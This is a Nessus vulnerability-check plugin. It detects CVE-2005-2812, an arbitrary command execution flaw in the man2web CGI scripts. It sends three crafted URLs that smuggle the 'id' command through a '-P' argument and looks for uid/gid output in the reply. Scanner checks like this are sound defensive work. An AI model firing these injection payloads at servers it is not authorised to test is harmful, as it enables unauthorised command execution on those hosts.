#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19591);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2005-2812");
  script_bugtraq_id(14747);
  script_xref(name:"OSVDB", value:"19515");
  script_xref(name:"OSVDB", value:"19516");
  script_xref(name:"OSVDB", value:"19517");

  script_name(english:"man2web Multiple Scripts Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows for arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running man2web, a program for
dynamically converting unix man pages to HTML. 

The installed version of man2web allows attackers to execute arbitrary
shell commands on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 
  script_summary(english:"Checks for command execution vulnerability in man2web");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# nb: not sure if this is from man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man-cgi?-P%20id%20ls",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);

# nb: this is definitely part of man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man2web?program=-P%20id%20ls",
  extra_check:"Man Page Lookup - -P id ls",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);

# nb: not sure if this is from man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man2html?section=-P%20id&topic=w",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);


